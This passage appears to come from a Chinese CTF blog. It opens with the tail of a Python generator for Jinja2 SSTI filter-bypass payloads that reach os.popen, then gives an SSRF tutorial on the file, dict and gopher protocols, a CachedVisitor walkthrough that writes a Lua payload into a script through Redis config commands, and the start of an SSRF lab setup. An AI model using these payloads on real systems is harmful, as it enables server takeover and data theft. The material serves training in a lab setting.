class="hljs-string">&quot;&quot;&quot;&#123;%set%0asub=request|attr(&#x27;application&#x27;)|attr(&#x27;__globals__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;__builtins__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;__import__&#x27;)(&#x27;subprocess&#x27;)%&#125;&#123;%set%0aso=request|attr(&#x27;application&#x27;)|attr(&#x27;__globals__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;__builtins__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;__import__&#x27;)(&#x27;os&#x27;)%&#125;&#123;%print(request|attr(&#x27;application&#x27;)|attr(&#x27;__globals__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;__builtins__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;__import__&#x27;)(&#x27;importlib&#x27;)|attr(&#x27;reload&#x27;)(sub))%&#125;&#123;%print(request|attr(&#x27;application&#x27;)|attr(&#x27;__globals__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;__builtins__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;__import__&#x27;)(&#x27;importlib&#x27;)|attr(&#x27;reload&#x27;)(so))%&#125;&#123;%print(g|attr(&#x27;pop&#x27;)|attr(&#x27;__globals__&#x27;)|attr(&#x27;get&#x27;)(&#x27;__builtins__&#x27;)|attr(&#x27;get&#x27;)(&#x27;setattr&#x27;)(g|attr(&#x27;pop&#x27;)|attr(&#x27;__globals__&#x27;)|attr(&#x27;get&#x27;)(&#x27;sys&#x27;)|attr(&#x27;modules&#x27;)|attr(&#x27;get&#x27;)(&#x27;werkzeug&#x27;)|attr(&#x27;serving&#x27;)|attr(&#x27;WSGIRequestHandler&#x27;),&#x27;server_version&#x27;,g|attr(&#x27;pop&#x27;)|attr(&#x27;__globals__&#x27;)|attr(&#x27;get&#x27;)(&#x27;__builtins__&#x27;)|attr(&#x27;get&#x27;)(&#x27;__import__&#x27;)(&#x27;os&#x27;)|attr(&#x27;popen&#x27;)(&#x27;&quot;&quot;&quot;</span>+cmd+<span class="hljs-string">&quot;&quot;&quot;&#x27;)|attr(&#x27;read&#x27;)()))%&#125;&quot;&quot;&quot;</span><br><br>    required_encoding = re.findall(<span class="hljs-string">&#x27;\&#x27;([a-z0-9_ /\.]+)\&#x27;&#x27;</span>, payloadstr)<br>    <span class="hljs-comment"># print(required_encoding)</span><br>    required_encoding.append(<span class="hljs-string">&#x27;WSGIRequestHandler&#x27;</span>)<br>    offset_a = <span class="hljs-number">16</span><br>    offset_0 = <span class="hljs-number">6</span><br>    offset_A = <span class="hljs-number">42</span><br>    encoded_payloads = &#123;&#125;<br><br>    arg_count = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> required_encoding:<br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> encoded_payloads:<br>            p = []<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> i:<br>                <span class="hljs-keyword">if</span> j == <span class="hljs-string">&#x27;_&#x27;</span>:<br>                    p.append(<span class="hljs-string">&#x27;k.2&#x27;</span>)<br>                <span class="hljs-keyword">elif</span> j == <span class="hljs-string">&#x27; &#x27;</span>:<br>                    p.append(<span class="hljs-string">&#x27;k.3&#x27;</span>)<br>                <span class="hljs-keyword">elif</span> j == <span class="hljs-string">&#x27;.&#x27;</span>:<br>                    p.append(<span class="hljs-string">&#x27;k.4&#x27;</span>)<br>                <span class="hljs-keyword">elif</span> j == <span class="hljs-string">&#x27;-&#x27;</span>:<br>                    p.append(<span class="hljs-string">&#x27;k.5&#x27;</span>)<br>                <span class="hljs-keyword">elif</span> j.isnumeric():<br>                    a = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">ord</span>(j)-<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;0&#x27;</span>)+offset_0)<br>                    p.append(<span class="hljs-string">f&#x27;k.<span class="hljs-subst">&#123;a&#125;</span>&#x27;</span>)<br>                <span class="hljs-keyword">elif</span> j == <span class="hljs-string">&#x27;/&#x27;</span>:<br>                    p.append(<span class="hljs-string">&#x27;k.68&#x27;</span>)<br>                <span class="hljs-keyword">elif</span> <span class="hljs-built_in">ord</span>(j) &gt;= <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-keyword">and</span> <span class="hljs-built_in">ord</span>(j) &lt;= <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;z&#x27;</span>):<br>                    a = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">ord</span>(j)-<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)+offset_a)<br>                    p.append(<span class="hljs-string">f&#x27;k.<span class="hljs-subst">&#123;a&#125;</span>&#x27;</span>)<br>                <span class="hljs-keyword">elif</span> <span class="hljs-built_in">ord</span>(j) &gt;= <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>) <span class="hljs-keyword">and</span> <span class="hljs-built_in">ord</span>(j) &lt;= <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;Z&#x27;</span>):<br>                    a = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">ord</span>(j)-<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>)+offset_A)<br>                    p.append(<span class="hljs-string">f&#x27;k.<span class="hljs-subst">&#123;a&#125;</span>&#x27;</span>)<br>            arg_name = <span class="hljs-string">f&#x27;a<span class="hljs-subst">&#123;arg_count&#125;</span>&#x27;</span><br>            encoded_arg = <span class="hljs-string">&#x27;&#123;%&#x27;</span> + <span class="hljs-string">&#x27;%0a&#x27;</span>.join([<span class="hljs-string">&#x27;set&#x27;</span>, arg_name , <span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-string">&#x27;~&#x27;</span>.join(p)]) + <span class="hljs-string">&#x27;%&#125;&#x27;</span><br>            encoded_payloads[i] = (arg_name, encoded_arg)<br>            arg_count+=<span class="hljs-number">1</span><br>            payload.append(encoded_arg)<br>    <span class="hljs-comment"># print(encoded_payloads)</span><br>    fully_encoded_payload = payloadstr<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> encoded_payloads.keys():<br>        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> fully_encoded_payload:<br>            fully_encoded_payload = fully_encoded_payload.replace(<span class="hljs-string">&quot;&#x27;&quot;</span>+ i +<span class="hljs-string">&quot;&#x27;&quot;</span>, encoded_payloads[i][<span class="hljs-number">0</span>])<br>    <span class="hljs-comment"># print(fully_encoded_payload)</span><br>    payload.append(fully_encoded_payload)<br>command = <span class="hljs-string">&quot;whoami&quot;</span><br>full_payload = <span class="hljs-string">&#x27;&#x27;&#x27;&#123;%print(request|attr(&#x27;application&#x27;)|attr(&#x27;__globals__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;__builtins__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;__import__&#x27;)(&#x27;os&#x27;)|attr(&#x27;popen&#x27;)(&#x27;&quot; + cmd + &quot;&#x27;)|attr(&#x27;read&#x27;)())%&#125;&#x27;&#x27;&#x27;</span><br>endpoint = <span class="hljs-string">&quot;r3al_ins1de_thought&quot;</span><br>payload.append(<span class="hljs-string">r&#x27;&#123;%for%0ai%0ain%0arequest.endpoint|slice(1)%&#125;&#x27;</span>)<br>word_data = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;data&#x27;</span>:<br>    word_data += <span class="hljs-string">&#x27;i.&#x27;</span> + <span class="hljs-built_in">str</span>(endpoint.find(i)) + <span class="hljs-string">&#x27;~&#x27;</span><br>word_data = word_data[:-<span class="hljs-number">1</span>] <span class="hljs-comment"># delete the last &#x27;~&#x27;</span><br><span class="hljs-comment"># Now we have &quot;data&quot;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;data: &quot;</span>+word_data)<br>payload.append(<span class="hljs-string">r&#x27;&#123;%set%0adat=&#x27;</span>+word_data+<span class="hljs-string">&#x27;%&#125;&#x27;</span>)<br>payload.append(<span class="hljs-string">r&#x27;&#123;%for%0ak%0ain%0arequest|attr(dat)|string|slice(1)%0a%&#125;&#x27;</span>)<br>generate_rce_command(command)<br><span class="hljs-comment"># payload.append(r&#x27;&#123;%print(j)%&#125;&#x27;)</span><br><span class="hljs-comment"># Here we use the &quot;data&quot; to construct the payload</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;request body: _ .-0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ/&#x27;</span>)<br><span class="hljs-comment"># use chr() to convert the number to character</span><br><span class="hljs-comment"># hiahiahia~ Now we get all of the charset, SSTI go go go!</span><br><br><br>payload.append(<span class="hljs-string">r&#x27;&#123;%endfor%&#125;&#x27;</span>)<br>payload.append(<span class="hljs-string">r&#x27;&#123;%endfor%&#125;&#x27;</span>)<br>output = <span class="hljs-string">&#x27;&#x27;</span>.join(payload)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">r&quot;fly-%23&#125;&quot;</span>+output)<br></code></pre></td></tr></table></figure><h2 id="思考-3"><a href="#思考-3" class="headerlink" title="思考"></a>思考</h2><p>ctf的成长速度大于ctfer的成长速度，🤡🤡</p><p>小半月没打ctf完全跟不上了，我靠</p>]]></content>
    
    
    <categories>
      
      <category>每日一web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSRF深入剖析+国光SSRF靶场攻克</title>
    <link href="/2025/04/07/SSRF%E6%B7%B1%E5%85%A5%E5%89%96%E6%9E%90-%E5%9B%BD%E5%85%89SSRF%E9%9D%B6%E5%9C%BA%E6%94%BB%E5%85%8B/"/>
    <url>/2025/04/07/SSRF%E6%B7%B1%E5%85%A5%E5%89%96%E6%9E%90-%E5%9B%BD%E5%85%89SSRF%E9%9D%B6%E5%9C%BA%E6%94%BB%E5%85%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前些天有个师傅问我软件安全赛那个ssrf打redis的题目，发现自己对于ssrf这一块并不是很懂，没有自己的一个思路，借以此篇来剖析ssrf</p><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>SSRF是一种由攻击者构造形成由服务端发起请求的一个安全漏洞，一般情况下，SSRF攻击的目标是从外网无法访问的内部系统，就是因为他是服务端发起的所有可以直接访问内网资源，<strong>ssrf的利用大多是协议的利用</strong></p><h2 id="常见协议"><a href="#常见协议" class="headerlink" title="常见协议"></a>常见协议</h2><h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><p><code>file://</code> 是一种<code>URI</code>协议，用于访问本地文件系统中的文件。它允许应用程序或浏览器直接从本地存储中读取文件，而无需通过网络请求</p><p>若我们可以控制服务端，那我们就可以利用他访问到内网机器文件</p><p>基本格式：<code>file://[主机名]/路径</code></p><ul><li><p><strong>主机名</strong>：通常为空，或者 <code>localhost</code>，表示访问本机文件。如果是远程系统，可以指定主机名（但多数情况下不支持）</p></li><li><p><strong>路径</strong>：指定本地文件的完整路径，注意区分Windows 和 Unix 系统</p></li><li><p>Windows 需要 <strong>三个斜杠</strong>（<code>///</code>），因为 <code>C:</code> 盘符本身包含 <code>:</code>，而 Unix 只需要两个斜杠（<code>//</code>）</p></li></ul><h3 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h3><p>可以用来探测内网服务，端口开启情况，以及命令执行，但是命令执行的时候必须是未设置密码的情况</p><p><strong>使用方式：</strong></p><ul><li><p><code>dict://serverip:port/</code>命令:参数</p></li><li><p>向服务器的端口请求为【命令:参数】，并在末尾自动补上\r\n(咳咳<code>csrf</code>?)</p></li><li><p>dict协议执行命令要一条一条执行</p></li></ul><p>主要就是探测服务和端口情况，执行命令的或很是鸡肋，基本就只有redis的未授权了</p><p>但是还是可以探测服务版本，就想我本地开个mysql有密码</p><p>使用dict去连接</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250407170723291.png" alt="image-20250407170723291"></p><p>可以看出是mysql数据库(手动滑稽)，还可以打打redis的未授权</p><h3 id="gopher"><a href="#gopher" class="headerlink" title="gopher"></a>gopher</h3><p>gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell，在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用TCP70端口</p><p>使用格式为</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">gopher:</span>//&lt;server&gt;<span class="hljs-symbol">:&lt;port&gt;/&lt;prefix&gt;&lt;encoded_data&gt;</span><br></code></pre></td></tr></table></figure><ul><li><strong><code>&lt;prefix&gt;</code></strong> 可以是单字符（如 <code>_</code>、<code>1</code> 等），但部分服务会根据前缀字符触发不同行为（如 Redis 会解析前缀为命令长度）。所以常用的还是<code>_</code></li><li>数据部分的特殊字符（如 <code>?</code>、<code>&amp;</code>、空格等）必须 URL 编码，否则会被截断或解析错误。</li></ul><p>这个协议最好玩的就是如果getshell的情况下，可以直接RCE，不用编码不用做格式转换，并且端口只需要存活即可，不用特殊端口，但是实用性感觉不大</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl gopher://localhost:80/_`<span class="hljs-built_in">cat</span> /home/1.txt &gt; 2.txt`<br></code></pre></td></tr></table></figure><p>命令是服务端执行</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250407175146983.png" alt="image-20250407175146983"></p><p>这个协议能够完美的解决<code>dict</code>协议只能执行一条命令导致无法攻击授权应用的短板</p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><h3 id="gopherus"><a href="#gopherus" class="headerlink" title="gopherus"></a>gopherus</h3><p>gopher协议的强大工具 <a href="https://github.com/Esonhugh/Gopherus3">地址</a></p><p>安装：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">pip install --use-pep517 git+https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/Esonhugh/</span>Gopherus3.git <span class="hljs-comment">#针对python3最新修正</span><br></code></pre></td></tr></table></figure><p>工具的基本针对的都是未授权服务，对于sql这种手写比较麻烦的确实工具不错</p><p>使用</p><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td>gopherus3 –帮助</td><td>帮助</td></tr><tr><td>gopherus3 –漏洞利用</td><td>参数可以是 ：</td></tr><tr><td></td><td>–利用 mysql -h</td></tr><tr><td></td><td>–利用 postgresql -h</td></tr><tr><td></td><td>–exploit fastcgi -h</td></tr><tr><td></td><td>–exploit redis -h</td></tr><tr><td></td><td>–exploit zabbix -h</td></tr><tr><td></td><td>–利用 pymemcache -h</td></tr><tr><td></td><td>–利用 rbmemcache -h</td></tr><tr><td></td><td>–利用 phpmemcache -h</td></tr><tr><td></td><td>–dmpmemcache -h 漏洞利用</td></tr><tr><td></td><td>–利用 smtp -h</td></tr></tbody></table><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250407181707687.png" alt="image-20250407181707687"></p><p>在对payload进行二次编码就行</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>CachedVisitor</p><p>搭建环境</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> build -t cachedvisitor:v1 .<br><span class="hljs-attribute">docker</span> run -d -p <span class="hljs-number">32777</span>:<span class="hljs-number">80</span> cachedvisitor:v1<br></code></pre></td></tr></table></figure><p> <img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408152900729.png" alt="image-20250408152900729"></p><p>可以通外网</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408152948780.png" alt="image-20250408152948780"></p><p>存在ssrf同时看到有个redis</p><p>看看dict是否可用</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408153340067.png" alt="image-20250408153340067"></p><p>dict可用，而且redis可用执行命令</p><p>分析一下源码</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-keyword">local</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read_file</span><span class="hljs-params">(filename)</span></span><br>    <span class="hljs-keyword">local</span> file = <span class="hljs-built_in">io</span>.<span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&quot;r&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> file <span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Error: Could not open file &quot;</span> .. filename)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>    <span class="hljs-keyword">end</span><br><br>    <span class="hljs-keyword">local</span> content = file:<span class="hljs-built_in">read</span>(<span class="hljs-string">&quot;*a&quot;</span>)<br>    file:<span class="hljs-built_in">close</span>()<br>    <span class="hljs-keyword">return</span> content<br><span class="hljs-keyword">end</span><br><br><span class="hljs-keyword">local</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">execute_lua_code</span><span class="hljs-params">(script_content)</span></span><br>    <span class="hljs-keyword">local</span> lua_code = script_content:<span class="hljs-built_in">match</span>(<span class="hljs-string">&quot;##LUA_START##(.-)##LUA_END##&quot;</span>)<br>    <span class="hljs-keyword">if</span> lua_code <span class="hljs-keyword">then</span><br>        <span class="hljs-keyword">local</span> chunk, err = <span class="hljs-built_in">load</span>(lua_code)<br>        <span class="hljs-keyword">if</span> chunk <span class="hljs-keyword">then</span><br>            <span class="hljs-keyword">local</span> success, result = <span class="hljs-built_in">pcall</span>(chunk)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> success <span class="hljs-keyword">then</span><br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Error executing Lua code: &quot;</span>, result)<br>            <span class="hljs-keyword">end</span><br>        <span class="hljs-keyword">else</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Error loading Lua code: &quot;</span>, err)<br>        <span class="hljs-keyword">end</span><br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Error: No valid Lua code block found.&quot;</span>)<br>    <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><br><span class="hljs-keyword">local</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br>    <span class="hljs-keyword">local</span> filename = <span class="hljs-string">&quot;/scripts/visit.script&quot;</span><br>    <span class="hljs-keyword">local</span> script_content = read_file(filename)<br>    <span class="hljs-keyword">if</span> script_content <span class="hljs-keyword">then</span><br>        execute_lua_code(script_content)<br>    <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><br>main()<br><br></code></pre></td></tr></table></figure><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">COPY</span><span class="language-bash"> flag /flag</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> readflag /readflag</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> 400 /flag</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +xs /readflag</span><br><br></code></pre></td></tr></table></figure><p>lua脚本会执行我们写在<code>/scripts/visit.script</code>的脚本，我们的目的是执行<code>readfile</code></p><p>我们用<code>redis</code>将<code> lua</code> 写入<code> visit.script</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">dict://127.0.0.1:6379/set:payload:<span class="hljs-string">&quot;##LUA_START##ngx.say(io.popen(&#x27;/readflag&#x27;):read(&#x27;*all&#x27;))##LUA_END##&quot;</span>  <span class="hljs-comment">#设置键payload为我们的命令 </span><br>dict://127.0.0.1:6379/config:<span class="hljs-built_in">set</span>:<span class="hljs-built_in">dir</span>:/scripts/  <span class="hljs-comment">#更改 Redis 配置，使其dir指向/scripts/目录</span><br>dict://127.0.0.1:6379/config:<span class="hljs-built_in">set</span>:dbfilename:visit.script  <span class="hljs-comment">#更改数据库文件名</span><br>dict://127.0.0.1:6379/bgsave <span class="hljs-comment">#保存</span><br></code></pre></td></tr></table></figure><p>在刷新一下执行脚本</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408153944930.png" alt="image-20250408153944930"></p><p>拿到flag</p><h1 id="国光SSRF靶场"><a href="#国光SSRF靶场" class="headerlink" title="国光SSRF靶场"></a>国光SSRF靶场</h1><p>地址：<a href="https://github.com/Duoduo-chino/ssrf_vul">https://github.com/Duoduo-chino/ssrf_vul</a></p><p>GitHub上找到的现成的镜像</p><p>靶场拓扑图(网段有变化);<code>·29.28没有</code></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/16205694239190.png" alt="16205694239190"></p><p>修改一下<code>docker-compose.yml</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">&#x27;2&#x27;</span><br><br><span class="hljs-attr">networks:</span><br>  <span class="hljs-attr">ssrf_v:</span><br>    <span class="hljs-attr">ipam:</span><br>      <span class="hljs-attr">config:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">subnet:</span> <span class="hljs-number">172.16</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-string">/16</span><br>          <span class="hljs-attr">gateway:</span> <span class="hljs-number">172.16</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br><br><span class="hljs-attr">services:</span> <br>  <span class="hljs-attr">ssrfweb1:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">registry.cn-hangzhou.aliyuncs.com/jinduoduo/ssrf_web:v1</span><br>    <span class="hljs-attr">ports:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-number">32780</span><span class="hljs-string">:80</span><br>    <span class="hljs-attr">networks:</span><br>      <span class="hljs-attr">ssrf_v:</span> <br>        <span class="hljs-attr">ipv4_address:</span> <span class="hljs-number">172.16</span><span class="hljs-number">.0</span><span class="hljs-number">.21</span><br> <br>  <span class="hljs-attr">ssrfweb2:</span> <br>    <span class="hljs-attr">image:</span> <span class="hljs-string">registry.cn-hangzhou.aliyuncs.com/jinduoduo/ssrf_web:v2</span><br>    <span class="hljs-attr">networks:</span> <br>      <span class="hljs-attr">ssrf_v:</span><br>        <span class="hljs-attr">ipv4_address:</span> <span class="hljs-number">172.16</span><span class="hljs-number">.0</span><span class="hljs-number">.22</span><br><br>  <span class="hljs-attr">ssrfweb3:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">registry.cn-hangzhou.aliyuncs.com/jinduoduo/ssrf_web:v3</span><br>    <span class="hljs-attr">networks:</span><br>      <span class="hljs-attr">ssrf_v:</span><br>        <span class="hljs-attr">ipv4_address:</span> <span class="hljs-number">172.16</span><span class="hljs-number">.0</span><span class="hljs-number">.23</span><br><br>  <span class="hljs-attr">ssrfweb4:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">registry.cn-hangzhou.aliyuncs.com/jinduoduo/ssrf_web:v4</span><br>    <span class="hljs-attr">networks:</span><br>      <span class="hljs-attr">ssrf_v:</span><br>        <span class="hljs-attr">ipv4_address:</span> <span class="hljs-number">172.16</span><span class="hljs-number">.0</span><span class="hljs-number">.24</span><br><br>  <span class="hljs-attr">ssrfweb5:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">registry.cn-hangzhou.aliyuncs.com/jinduoduo/ssrf_web:v5</span><br>    <span class="hljs-attr">networks:</span><br>      <span class="hljs-attr">ssrf_v:</span><br>        <span class="hljs-attr">ipv4_address:</span> <span class="hljs-number">172.16</span><span class="hljs-number">.0</span><span class="hljs-number">.25</span><br><br>  <span class="hljs-attr">ssrfweb6:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">registry.cn-hangzhou.aliyuncs.com/jinduoduo/ssrf_web:v6</span><br>    <span class="hljs-attr">networks:</span><br>      <span class="hljs-attr">ssrf_v:</span><br>        <span class="hljs-attr">ipv4_address:</span> <span class="hljs-number">172.16</span><span class="hljs-number">.0</span><span class="hljs-number">.26</span><br><br>  <span class="hljs-attr">ssrfweb7:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">registry.cn-hangzhou.aliyuncs.com/jinduoduo/ssrf_web:v7</span><br>    <span class="hljs-attr">networks:</span><br>      <span class="hljs-attr">ssrf_v:</span><br>        <span class="hljs-attr">ipv4_address:</span> <span class="hljs-number">172.16</span><span class="hljs-number">.0</span><span class="hljs-number">.27</span><br><br></code></pre></td></tr></table></figure><p>进入站点是一个爬虫网站，我们输入百度试试</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408161712436.png" alt="image-20250408161712436"></p><p>可以回显，试着读取文件</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408161811463.png" alt="image-20250408161811463"></p><p>ok也是可以的，那我们读取首页文件看看</p><p><code>file:///var/www/html/index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">curl</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span>&#123;<br>    <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>    <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br>  &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>很标准的SSRF请求</p><p>接下来我们读取hosts文件看看</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408162647474.png" alt="image-20250408162647474"></p><p>知道这台机器是<code>172.16.0.21</code>我们借助<code>dict</code>协议扫下网段</p><figure class="highlight python"><table><tr><td 